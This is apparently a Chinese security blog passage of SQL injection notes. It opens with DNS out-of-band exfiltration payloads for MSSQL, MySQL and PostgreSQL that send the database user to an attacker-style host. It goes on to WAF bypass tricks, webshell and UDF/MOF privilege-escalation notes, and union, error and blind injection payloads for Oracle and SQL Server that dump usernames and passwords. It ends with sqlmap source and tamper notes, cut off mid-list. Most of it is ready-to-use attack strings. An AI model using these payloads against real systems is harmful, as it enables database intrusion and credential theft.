<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/*检测*/</span><br><span class="line">EXEC master..xp_dirtree &#x27;\\oob.dnsattacker.com \&#x27; –</span><br><span class="line"></span><br><span class="line">/*Payload，需要 sysadmin 权限*/</span><br><span class="line">DECLARE @data varchar(1024);</span><br><span class="line">SELECT @data = (SELECT system_user);  </span><br><span class="line">EXEC(&#x27;master..xp_dirtree &quot;\\&#x27;+@data+&#x27;.oob.dnsattacker.com\foo$&quot;&#x27;);</span><br><span class="line"></span><br><span class="line">/*其他方法*/</span><br><span class="line">xp_fileexists,</span><br><span class="line">xp_subdirs,</span><br><span class="line">xp_getfiledetails,</span><br><span class="line">sp_add_sobstep</span><br></pre></td></tr></table></figure>

<p>MySQL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*检测*/</span><br><span class="line">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;, &#x27;oob.dnsattacker.com\\test.txt&#x27;));</span><br><span class="line"></span><br><span class="line">/*payload，需要 file,select,update 权限*/</span><br><span class="line">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;, (SELECT HEX(CONCAT(user(),&quot;\n&quot;))), &#x27;.oob.dnsattacker.com\\test.txt&#x27;));</span><br></pre></td></tr></table></figure>

<p>Postgresql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/*检测*/</span><br><span class="line">CREATE EXTENSION dblink;SELECT dblink_connect(&#x27;host=oob.dnsattacker.com user=postgres password=password dbname=dvdrental&#x27;);</span><br><span class="line"></span><br><span class="line">/*payload，需要 superuser 权限执行 CREATE EXTENSION 查询*/</span><br><span class="line">DROP TABLE IF EXISTS table_output;</span><br><span class="line">CREATE TABLE table_output(content text);</span><br><span class="line">CREATE OR REPLACE FUNCTION temp_function()</span><br><span class="line">RETURNS VOID AS $$</span><br><span class="line">DECLARE exec_cmd TEXT;</span><br><span class="line">DECLARE query_result TEXT;</span><br><span class="line">BEGIN</span><br><span class="line">    SELECT INTO query_result (SELECT encode(convert_to(concat(user,&#x27;     &#x27;), &#x27;UTF8&#x27;),&#x27;hex&#x27;));</span><br><span class="line">    exec_cmd := E&#x27;COPY table_output(content) FROM E\&#x27;\\\\\\\\&#x27;||query_result||E&#x27;.oob.dnsattacker.com\\\\foobar.txt\&#x27;&#x27;;</span><br><span class="line">    EXECUTE exec_cmd;</span><br><span class="line">END;</span><br><span class="line">$$ LANGUAGE plpgsql SECURITY DEFINER;</span><br><span class="line">SELECT temp_function();</span><br></pre></td></tr></table></figure>

<p>DNS数据提取的限制：</p>
<ul>
<li>域名最多包含127个子域</li>
<li>每个子域最多包含63字符</li>
<li>完整域名最大长度为253字符</li>
<li>由于DNS记录缓存，会为每个请求的URL添加一个唯一值</li>
<li>DNS是明文通道，可悲中间节点和DNS服务器缓存使用，敏感数据可能泄露</li>
</ul>
<h2 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h2><p>查询时没有发生注入，但是查询的结果或者语句用在了其他地方，产生了注入。可参考sqli-labs less-25</p>
<h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><p>搜索框</p>
<p>日期类型参数，如果没有进行强制类型转换容易出现注入</p>
<p>order by:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by 1 and(updatexml(1,concat(0x7e,@@version,0x7e),0))</span><br><span class="line">order by if(1=2,1,(select(1)from(select(sleep(2)))test))</span><br><span class="line">order by (select 1 regexp if(substring(user(),1,1)=0x72,1,0x00))</span><br></pre></td></tr></table></figure>

<p>limit:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit 1,1 procedure analyse(extractvalue(1,concat(0x7e,version(),0x7e)),1)</span><br></pre></td></tr></table></figure>

<p>group by:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group by if(1=2,1,(select(1)from(select(sleep(2)))test))</span><br></pre></td></tr></table></figure>

<p>table:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users where updatexml(1,concat(0x7e,(select user()),0x7e),1)#</span><br></pre></td></tr></table></figure>

<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// 合并</span><br><span class="line">concat(str1,str2,...)</span><br><span class="line">concat_ws(separator, str1, str2)</span><br><span class="line">// 截取</span><br><span class="line">substring(str,pos,n)</span><br><span class="line">substr(str,pos,n)</span><br><span class="line">mid(str,pos,n)</span><br><span class="line">left(str,len)</span><br><span class="line">right(str,len)</span><br><span class="line">substring_index(str,delim,count)</span><br><span class="line">// 计算字符串长度</span><br><span class="line">char_length()</span><br><span class="line">character_length()</span><br><span class="line">length()</span><br><span class="line">octet_length()</span><br><span class="line">// 替换</span><br><span class="line">replace()</span><br><span class="line">// 查找子串</span><br><span class="line">locate()</span><br><span class="line">instr()</span><br><span class="line">position()</span><br><span class="line">find_in_set()</span><br><span class="line">// 正则匹配</span><br><span class="line">like 常用通配符 %(匹配0个或任意多个字符)，_(匹配一个字符)，escape(转义%和_)</span><br><span class="line">regexp/rlike 正则表达式匹配</span><br><span class="line">// 二进制比较(可区分大小写)</span><br><span class="line">select &quot;A&quot; = BINARY &quot;a&quot; // 结果为 0</span><br><span class="line">// 自定义排序，盲注开关</span><br><span class="line">elt(N, str1, str2,...) // 若 N=1，则返回 str1，N=2 则返回 str2,未找到返回 NULL</span><br><span class="line">select elt(1,1) // 结果为1</span><br><span class="line">select elt(1,0) // 结果为0</span><br><span class="line"></span><br><span class="line">field(1,0) //结果为0</span><br><span class="line">field(1,1) /结果为1</span><br><span class="line"></span><br><span class="line">// 不使用逗号</span><br><span class="line">substr(database(),1,1) limit n,m</span><br><span class="line">substr(database from 1 for 1) limit m offset n </span><br><span class="line"></span><br><span class="line">union select 1,2,3</span><br><span class="line">union select * from ((select 1)a JOIN (select 2)b JOIN (select 3)c)</span><br><span class="line"></span><br><span class="line">elect ascii(mid(user(),1,1))=80   </span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量分为 普通变量以@开头，连接关闭时释放，系统变量以@@开头，表示 Mysql 服务器的属性，许多系统变量有两种形式，@@session.wait.wait_timeout 表示当前连接，@@global.wait_timeout 表示服务器。</p>
<p>set 使用 = 赋值，select 使用 := 或 into 赋值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set @varname=3;</span><br><span class="line">select @varname; // 3</span><br><span class="line">select @varname:=4</span><br><span class="line">select @varname; // 4</span><br><span class="line">select count(*) from users into @varname;</span><br><span class="line">select @varname; // 5</span><br></pre></td></tr></table></figure>

<p>可以用表达式给变量赋值，赋值运算符优先级最低。</p>
<h3 id="条件表达式"><a href="#条件表达式" class="headerlink" title="条件表达式"></a>条件表达式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(condition, result1, result2);</span><br><span class="line">case expr when val1 then result1 when val2 then result2 else result3;</span><br><span class="line">case when condition1 then result1 when condition2 then result2 else result3;</span><br></pre></td></tr></table></figure>

<h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单行 # 和 -- (有空格)</span><br><span class="line">多行 /* */</span><br><span class="line">内联 /*! */ 默认执行其中的内容，如包含版本号，高于该版本号才会执行</span><br></pre></td></tr></table></figure>

<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>可用 <code>0x1234</code>或<code>x&#39;1234&#39;</code>表示十六进制；</p>
<p>支持字符串和数指之间转换，<code>&#39;12.34a&#39;+1</code>为<code>13.34</code></p>
<p>支持二进制数值，<code>b&#39;1011&#39;</code></p>
<p>首先确定被拦截的部分，针对性绕过。</p>
<p>大小写 <code>SelECt</code></p>
<p>双写 <code>seleselectct</code></p>
<p>编码，url 或者 hex</p>
<p>空格，用括号，注释<code>/**/</code>，<code>%a0</code>绕过</p>
<p>逗号绕过，在 <code>substr()</code>和<code>mid()</code>中使用<code>from to</code></p>
<p>比较符号绕过，<code>greattest</code> <code>between and</code></p>
<p>regexp 正则 和 like 注入</p>
<p>逻辑，<code>and</code>和<code>&amp;&amp;</code>，<code>or</code>和<code>||</code>，<code>xor</code>和<code>|</code>，<code>not</code>和<code>!</code>可以替换</p>
<p>函数，<code>hex()</code>、<code>bin()</code>和<code>ascii()</code>，<code>concat_ws()</code>和<code>group_concat()</code>，<code>mid()</code>、<code>substr()</code>和<code>substring()</code></p>
<p>HTTP参数污染，<code>id=1 union select 1,2,3 from users where id=1-</code>变成<code>id=1 union select 1&amp;id=2,3 from users where  id=1-</code></p>
<p>缓冲区溢出，<code>id=1 and (select 1)=(Select  0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+version(),database(),user()–+</code></p>
<p>注释符 <code>#comment</code> <code>/*comment*/</code> <code>-- comment</code></p>
<p>内联注释 <code>/*!comment*/</code>，<code>id=1/*!UniOn*/Select 1#</code></p>
<p>select，使用handler语句代替（Mysql）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>

<p>字符串可使用 16 进制编码，不使用引号</p>
<p>group_concat 可以用 concat_ws 替换</p>
<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><h3 id="SMB-Relay-攻击"><a href="#SMB-Relay-攻击" class="headerlink" title="SMB Relay 攻击"></a>SMB Relay 攻击</h3><h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>当SQL接受异或操作符时，可以通过异或完成盲注。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1^(exp)^1%23</span><br></pre></td></tr></table></figure>

<p>当 exp 为 true 时，返回 id=1 的结果，false 返回 id=0 的结果。</p>
<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>例如SWPU2019]Web1，无法得到列名。</p>
<p>可以利用union select构造新的列名（需要知道列数），以sqli-labs的security库为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from users;</span><br></pre></td></tr></table></figure>

<p>返回结果是一张新的表，列名分别是1，2，3，然后再从这张新表中查询数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from users)as a;</span><br><span class="line">select `3` from (select 1,2,3 union select * from users)a;</span><br><span class="line"># 这两种等价</span><br></pre></td></tr></table></figure>

<p>就在不知道列名的情况下得到了第三列的数据，as a是为这张新表指定一个别名，否则会出错。反引号表示查询的这个列名为3，而不是select 数字3。</p>
<p>也可以为列设置别名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 a,2 b,3 c union select * from users;</span><br></pre></td></tr></table></figure>

<p>这样就可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select c from (select 1,2,3 c union select * from users)a;</span><br></pre></td></tr></table></figure>

<h3 id="无法使用information-schema"><a href="#无法使用information-schema" class="headerlink" title="无法使用information_schema"></a>无法使用information_schema</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_auto_increment_columns，需要在表中有一个自增的字段，一般是id。</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$ps_schema_table_statistics_io</span><br><span class="line">mysql.innodb_index_stats</span><br><span class="line">mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>

<h2 id="后续操作"><a href="#后续操作" class="headerlink" title="后续操作"></a>后续操作</h2><h3 id="写入-webshell"><a href="#写入-webshell" class="headerlink" title="写入 webshell"></a>写入 webshell</h3><p>写入webshell是有条件的，包括：</p>
<ul>
<li><code>secure_file_priv</code>配置项<ul>
<li><code>NULL</code>，禁止导入或导出文件</li>
<li><code>/tmp/</code>，只能在 tmp 目录下导入导出文件</li>
<li><code> </code>，（空串），无限制</li>
</ul>
</li>
<li>运行数据库的用户有写权限</li>
<li>知道 web 目录位置</li>
</ul>
<p>任意文件上传没有路径时，数据库中会存储路径，配合 sqlmap 的 <code>--sql-shell</code> 和 <code>--search</code> 寻找 shell 位置。</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="UDF-提权"><a href="#UDF-提权" class="headerlink" title="UDF 提权"></a>UDF 提权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、其利用条件是目标系统是Windows(Win2000,XP,Win2003)；拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete</span><br><span class="line">权限以创建和抛弃函数,有root账号密码。</span><br><span class="line">2、Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</span><br><span class="line">3、Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\</span><br><span class="line">system32。</span><br><span class="line">4、掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备root账号所具备的权限</span><br><span class="line">的其它账号也可以。</span><br></pre></td></tr></table></figure>



<h4 id="MOF-提权"><a href="#MOF-提权" class="headerlink" title="MOF 提权"></a>MOF 提权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们</span><br><span class="line">的cmd命令使其被带入执行。</span><br><span class="line">使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下。</span><br></pre></td></tr></table></figure>

<h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><h3 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a>联合注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select user,null from dual--</span><br><span class="line">?id=-1&#x27; union select version,null from v$instance--</span><br><span class="line">?id=-1&#x27; union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--</span><br><span class="line">?id=-1&#x27; union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name =&#x27;USERS&#x27;) where limit=2)--</span><br><span class="line">?id=-1&#x27; union select username,passwd from users--</span><br><span class="line">?id=-1&#x27; union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit=3)--</span><br></pre></td></tr></table></figure>

<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select user from dual))--</span><br><span class="line">?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select banner from v$version where banner like &#x27;Oracle%))--</span><br><span class="line">?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select table_name from (select rownum as limit,table_name from user_tables) where limit= 3))--</span><br><span class="line">?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name =&#x27;USERS&#x27;) where limit=3))--</span><br><span class="line">?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select passwd from (select passwd,rownum as limit from users) where limit=1))</span><br></pre></td></tr></table></figure>

<h3 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>除了 ifelse，还可以使用 encode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">decode（条件，值1，返回值1，值2，返回值2，...值n，返回值n，更改值）</span><br><span class="line"></span><br><span class="line">相当于：</span><br><span class="line">IF 条件=值1 THEN</span><br><span class="line">　　　　RETURN(返回值1)</span><br><span class="line">ELSIF 条件=值2 THEN</span><br><span class="line">　　　　RETURN(返回值2)</span><br><span class="line">　　　　......</span><br><span class="line">ELSIF 条件=值n THEN</span><br><span class="line">　　　　RETURN(返回值n)</span><br><span class="line">ELSE</span><br><span class="line">　　　　RETURN(缺省值)</span><br><span class="line">END IF</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0,0) from dual)--</span><br><span class="line">?id=1&#x27; and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0,0) from dual)--</span><br></pre></td></tr></table></figure>

<h3 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5) else 1 end)--</span><br><span class="line">?id=1&#x27; and 1=(case when ascii(substr(user,1,1))&gt; 64 then DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5) else 1 end)--</span><br></pre></td></tr></table></figure>

<h2 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h2><h3 id="联合注入-2"><a href="#联合注入-2" class="headerlink" title="联合注入"></a>联合注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select null,null--</span><br><span class="line">?id=-1&#x27; union select @@servername, @@version--</span><br><span class="line">?id=-1&#x27; union select db_name(),suser_sname()--</span><br><span class="line">?id=-1&#x27; union select (select top 1 name from sys.databases where name not in (select top 6 name from sys.databases)),null--</span><br><span class="line">?id=-1&#x27; union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--</span><br><span class="line">?id--1&#x27; union select (select top 1 table_ name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)),null--</span><br><span class="line">?id=-1&#x27; union select (select top 1 column name from information_schema.columns where table_name=&#x27;users&#x27; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#x27;users&#x27;)),null---</span><br><span class="line">?id=-1&#x27; union select (select top 1 username from users where username not in (select top 3 username from users)),null--</span><br></pre></td></tr></table></figure>

<h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=(select 1/@@servername)--</span><br><span class="line">?id=1&#x27; and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))--</span><br></pre></td></tr></table></figure>



<h3 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substring((select db_ name(1)),1,1))&gt; 64--</span><br></pre></td></tr></table></figure>



<h3 id="时间盲注-2"><a href="#时间盲注-2" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id= 1&#x27;;if(2&gt;1) waitfor delay &#x27;0:0:5&#x27;--</span><br><span class="line">?id= 1&#x27;;if(ASCII(SUBSTRING((select db_name(1)),1,1))&gt; 64) wait</span><br></pre></td></tr></table></figure>

<p>MSSQL，<a href="%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E4%BA%86%E8%A7%A3MSSQL%E6%B3%A8%E5%85%A5.pdf">由浅入深了解MSSQL注入.pdf</a></p>
<h2 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h2><p>Postgresql， copy from， copy to 读文件。</p>
<h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><p><a target="_blank" rel="noopener" href="https://sqlmap.campfire.ga/">中文手册</a></p>
<h3 id="读源码"><a href="#读源码" class="headerlink" title="读源码"></a>读源码</h3><p>版本：sqlmap-1.5.3-27-gdd32bfb</p>
<h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── COMMITMENT</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README.md</span><br><span class="line">├── data</span><br><span class="line">├── doc</span><br><span class="line">├── extra</span><br><span class="line">├── lib</span><br><span class="line">├── plugins</span><br><span class="line">├── sqlmap.conf</span><br><span class="line">├── sqlmap.py</span><br><span class="line">├── sqlmapapi.py</span><br><span class="line">├── tamper</span><br><span class="line">└── thirdparty</span><br></pre></td></tr></table></figure>

<h4 id="sqlmap-py"><a href="#sqlmap-py" class="headerlink" title="sqlmap.py"></a><code>sqlmap.py</code></h4><p>导入包，检查环境</p>
<p>133 行，main 函数</p>
<p>检查错误，设置环境，接受命令行参数，初始化（init 函数，<code>lib/core/option.py</code>）</p>
<p>182 行，核心功能，从 profile 或者命令行接受目标，进入 start 函数</p>
<h4 id="lib-controller-controller-py"><a href="#lib-controller-controller-py" class="headerlink" title="lib/controller/controller.py"></a><code>lib/controller/controller.py</code></h4><p>start 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def start():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    This function calls a function that performs checks on both URL</span><br><span class="line">    stability and all GET, POST, Cookie and User-Agent parameters to</span><br><span class="line">    check if they are dynamic and SQL injection affected</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">   	...</span><br></pre></td></tr></table></figure>

<p>279 行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if conf.direct:</span><br><span class="line">        initTargetEnv()</span><br><span class="line">        setupTargetEnv()</span><br><span class="line">        action()</span><br><span class="line">        return True</span><br></pre></td></tr></table></figure>

<p>如果</p>
<h4 id="lib-controller-action-py"><a href="#lib-controller-action-py" class="headerlink" title="lib/controller/action.py"></a><code>lib/controller/action.py</code></h4><h3 id="自带tampers"><a href="#自带tampers" class="headerlink" title="自带tampers"></a>自带tampers</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py                用UTF-8全角字符替换&#x27;（例如&#x27;-&gt;％EF％BC％87）</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py          